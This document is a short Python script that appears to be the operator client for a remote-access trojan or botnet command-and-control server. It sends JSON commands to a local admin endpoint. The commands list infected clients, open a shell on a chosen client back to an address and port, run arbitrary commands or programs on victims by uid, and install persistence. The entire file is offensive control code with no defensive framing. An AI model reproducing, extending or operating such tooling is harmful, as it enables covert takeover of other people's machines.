#!/usr/bin/python3
import requests

class admin:
    def __init__(self,addr="http://127.0.0.1:8080/admin"):
        self.addr=addr

    def doRequest(self,json):
        try:
            r=requests.post(self.addr,json=json)
            print(r.json()['status'])
            return (r.status_code==200)
        except Exception as e:
            print("exception ocurred!",e)
            return False
        
    
    #RPCS CALLS
    def displayClients(self):
        json={"CMD":"displayClients"}
        return self.doRequest(json)

    def abrirShell(self,uid,addr,port):
        print("displaying clientes!!")
        json={"CMD":"abrirShell","uid":uid,"port":str(port),"addr":addr}
        return self.doRequest(json)

    def executeProgram(self,fname,uid=0):
        json={"CMD":"executeProgram","uid":uid,"fname":fname}
        return self.doRequest(json)

    def runCommand(self,cmd,uid=0):
        json={"CMD":"runCommand","cmdString":cmd,"uid":uid}
        return self.doRequest(json)
    
    def install(self,uid=0):
        json={"CMD":"installPersistency","uid":uid}
        return self.doRequest(json)

    def testServer(self):
        json={"CMD":"testServer"}
        return self.doRequest(json)

    def testClient(self,uid=0):
        json={"CMD":"testClient","uid":uid}
        return self.doRequest(json)


master=admin()
